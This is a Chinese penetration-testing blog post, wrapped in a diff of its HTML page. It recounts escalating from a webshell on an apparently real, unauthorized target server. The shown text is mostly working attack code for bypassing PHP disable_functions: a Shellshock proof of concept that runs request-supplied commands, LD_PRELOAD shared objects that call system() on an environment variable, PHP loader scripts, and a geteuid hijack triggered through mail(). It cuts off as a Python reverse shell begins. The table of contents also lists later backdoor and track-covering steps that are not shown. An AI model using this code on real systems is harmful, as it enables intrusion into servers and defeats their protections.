@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/a-difficult-penetration-process.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="一次艰难的渗透提权过程 - F0rmat&#39;s Blog">
+    <meta property="og:title" content="一次艰难的渗透提权过程 - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="一次艰难的渗透提权过程 - F0rmat&#39;s Blog">
+    <meta name="description" content="0x01 前言 某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。 Getshell的漏洞分析在:https://g">
+    <meta property="og:description" content="0x01 前言 某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。 Getshell的漏洞分析在:https://g">
+    <meta property="twitter:description" content="0x01 前言 某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。 Getshell的漏洞分析在:https://g">
+    <meta property="og:type" content="article">
+    <title>一次艰难的渗透提权过程 - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/a-difficult-penetration-process.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/a-difficult-penetration-process.html" title="一次艰难的渗透提权过程">一次艰难的渗透提权过程</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2019-09-09 02:11:19 UTC">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 09 Sep 2019
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            3445 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            7 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-前言">0x01 前言</a></li>
+    <li><a href="#0x02-信息探测">0x02 信息探测</a></li>
+    <li><a href="#0x03-肝">0x03 肝</a></li>
+    <li><a href="#0x04-新希望-ld_preload">0x04 新希望 LD_PRELOAD</a></li>
+    <li><a href="#0x05-柳暗花明又一村-centos">0x05 柳暗花明又一村-centos</a>
+      <ul>
+        <li><a href="#劫持getuid">劫持getuid()</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x06-脏牛提权">0x06 脏牛提权</a></li>
+    <li><a href="#0x07-持续访问-ssh后门">0x07 持续访问-ssh后门</a></li>
+    <li><a href="#0x08-metaspliot-横向渗透">0x08 metaspliot 横向渗透</a></li>
+    <li><a href="#0x09-擦屁股">0x09 擦屁股</a></li>
+    <li><a href="#0x10-结束">0x10 结束</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h1 id="0x01-前言">0x01 前言</h1>
+<p>某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/1.png" alt=""></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/2.png" alt=""></p>
+<p>Getshell的漏洞分析在:https://getpass.cn/2019/09/06/An-APP-distribution-system-upload-vulnerability/</p>
+<p>然后搞了好久熬了一个晚上才弄好，中间走了很多弯路。。。</p>
+<h1 id="0x02-信息探测">0x02 信息探测</h1>
+<p>上一个phpinfo看下环境</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PHP Version 5.6.30
+</span></span><span class="line"><span class="cl">disable_functions:
+</span></span><span class="line"><span class="cl">passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru
+</span></span><span class="line"><span class="cl">sendmail_path:/usr/sbin/sendmail -t -i
+</span></span><span class="line"><span class="cl">mysql:	mysqlnd 5.0.11-dev - 20120503
+</span></span></code></pre></div><p>宝塔警告！
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/3.png" alt=""></p>
+<p>问了宝塔的开发工程师，宝塔确实是做得挺好的，Windows的基本没什么希望了，看下Linux的。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/4.png" alt=""></p>
+<h1 id="0x03-肝">0x03 肝</h1>
+<p><code>putenv</code>这个没禁可以利用一下，看了P神的一篇文章：https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html
+<a href="http://www.exploit-db.com/exploits/35146/">http://www.exploit-db.com/exploits/35146/</a> 的POC</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
+</span></span></span><span class="line"><span class="cl"><span class="c1"># Google Dork: none 
+</span></span></span><span class="line"><span class="cl"><span class="c1"># Date: 10/31/2014 
+</span></span></span><span class="line"><span class="cl"><span class="c1"># Exploit Author: Ryan King (Starfall) 
+</span></span></span><span class="line"><span class="cl"><span class="c1"># Vendor Homepage: http://php.net 
+</span></span></span><span class="line"><span class="cl"><span class="c1"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
+</span></span></span><span class="line"><span class="cl"><span class="c1"># Version: 5.* (tested on 5.6.2) 
+</span></span></span><span class="line"><span class="cl"><span class="c1"># Tested on: Debian 7 and CentOS 5 and 6 
+</span></span></span><span class="line"><span class="cl"><span class="c1"># CVE: CVE-2014-6271 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">shellshock</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Execute a command via CVE-2014-6271 @mail.c:283 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nv">$tmp</span> <span class="o">=</span> <span class="nx">tempnam</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="s2">&#34;data&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">   <span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;PHP_LOL=() { x; }; </span><span class="si">$cmd</span><span class="s2"> &gt;</span><span class="si">$tmp</span><span class="s2"> 2&gt;&amp;1&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">   <span class="c1">// In Safe Mode, the user may only alter environment variableswhose names 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="c1">// begin with the prefixes supplied by this directive. 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="c1">// By default, users will only be able to set environment variablesthat 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="c1">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="c1">// PHP will let the user modify ANY environment variable! 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;a@127.0.0.1&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;-bv&#34;</span><span class="p">);</span> <span class="c1">// -bv so we don&#39;t actuallysend any mail 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">   <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">   <span class="k">if</span><span class="p">(</span><span class="nv">$output</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">   <span class="k">else</span> <span class="k">return</span> <span class="s2">&#34;No output, or not vuln.&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">shellshock</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span> 
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/5.png" alt=""></p>
+<p>没戏。。</p>
+<p>继续肝。。。</p>
+<h1 id="0x04-新希望-ld_preload">0x04 新希望 LD_PRELOAD</h1>
+<p>上gayhub上面搜了一下看到了一篇不错的姿势https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</p>
+<p>按照了里面的一段代码<code>bypass_disablefunc.c</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">preloadme</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmdline</span> <span class="o">=</span> <span class="nf">getenv</span><span class="p">(</span><span class="s">&#34;EVIL_CMDLINE&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="n">cmdline</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>编译了一下
+然后上传调用文件php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$out_path</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;outpath&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$evil_cmdline</span> <span class="o">=</span> <span class="nv">$cmd</span> <span class="o">.</span> <span class="s2">&#34; &gt; &#34;</span> <span class="o">.</span> <span class="nv">$out_path</span> <span class="o">.</span> <span class="s2">&#34; 2&gt;&amp;1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &#34;</span> <span class="o">.</span> <span class="nv">$evil_cmdline</span> <span class="o">.</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;EVIL_CMDLINE=&#34;</span> <span class="o">.</span> <span class="nv">$evil_cmdline</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$so_path</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;sopath&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;LD_PRELOAD=&#34;</span> <span class="o">.</span> <span class="nv">$so_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&#34;</span> <span class="o">.</span> <span class="nx">nl2br</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$out_path</span><span class="p">))</span> <span class="o">.</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$out_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>利用的时候没回显，what？
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/6.png" alt=""></p>
+<p>又找了一篇文章：https://www.cnblogs.com/leixiao-/p/10612798.html
+还是利用unix的<code>LD_PRELOAD</code>和php的<code>putenv</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">l3yx</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="nf">getenv</span><span class="p">(</span><span class="s">&#34;_evilcmd&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>利用php文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;_evilcmd=echo 1&gt;/root/tmp/222222&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;LD_PRELOAD=./evil.so&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mail</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
+</span></span></code></pre></div><p>执行后去刷新了一下目录，！！！！我去，成功了！</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/7.png" alt=""></p>
+<p>但是这样执行代码总是有众多不便的，比如没有回显，把命令带参数执行的时候会报错等
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/8.png" alt=""></p>
+<p>还得继续。。。</p>
+<h1 id="0x05-柳暗花明又一村-centos">0x05 柳暗花明又一村-centos</h1>
+<p>看了大佬一篇文章https://www.meetsec.cn/index.php/archives/44/</p>
+<p>一个修复版的bypass.c,作者的解释：</p>
+<blockquote>
+<p>如果你是一个细心的人你会发现这里的bypass_disablefunc.c（来自github）和教程中提及的不一样，多出了使用for循环修改LD_PRELOAD的首个字符改成\0，如果你略微了解C语言就会知道\0是C语言字符串结束标记，原因注释里有：unsetenv(&ldquo;LD_PRELOAD&rdquo;)在某些Linux发行版不一定生效（如CentOS），这样一个小动作能够让系统原有的LD_PRELOAD环境变量自动失效</p>
+</blockquote>
+<p>然后从环境变量 EVIL_CMDLINE 中接收 bypass_disablefunc.php 传递过来的待执行的命令行。</p>
+<p>用命令 gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so 将 bypass_disablefunc.c 编译为共享对象 bypass_disablefunc_x64.so：</p>
+<p>要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">extern</span> <span class="kt">char</span><span class="o">**</span> <span class="n">environ</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">preload</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// get command line options and arg
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmdline</span> <span class="o">=</span> <span class="nf">getenv</span><span class="p">(</span><span class="s">&#34;EVIL_CMDLINE&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// unset environment variable LD_PRELOAD.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// unsetenv(&#34;LD_PRELOAD&#34;) no effect on some 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// distribution (e.g., centos), I need crafty trick.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">strstr</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// executive command
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">system</span><span class="p">(</span><span class="n">cmdline</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/9.png" alt=""></p>
+<p>偶~sex!
+后来作者确实改进了代码
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/10.png" alt="">
+中间也发现了一篇不错的方法：https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/</p>
+<h2 id="劫持getuid">劫持getuid()</h2>
+<p>基本原理
+前提是在Linux中已安装并启用sendmail程序。</p>
+<p>php的mail()函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，而/usr/sbin/sendmail会调用getuid()。如果我们能通过LD_PRELOAD的方式来劫持getuid()，再用mail()函数来触发sendmail程序进而执行被劫持的getuid()，从而就能执行恶意代码了。</p>
+<p>细化一下：</p>
+<p>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 evil.so；
+运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 evil.so，以便后续启动新进程时优先加载该共享对象；
+运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 evil.so 中的同名 getuid() 所劫持；
+达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">geteuid</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmdline</span> <span class="o">=</span> <span class="nf">getenv</span><span class="p">(</span><span class="s">&#34;EVIL_CMDLINE&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">getenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="n">cmdline</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><code>gcc -shared -fPIC bypass.c -o byapss.so</code> 编译了一下去利用，发现可以哦！</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/11.png" alt=""></p>
+<h1 id="0x06-脏牛提权">0x06 脏牛提权</h1>
+<p>可以执行命令了，执行上反弹shell，有交互的shell舒服多了，这里用python的反弹脚本，一般系统有装python脚本，我都会先用pyhton，因为有一些系统的不一样，bash或者nc比较麻烦。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span>
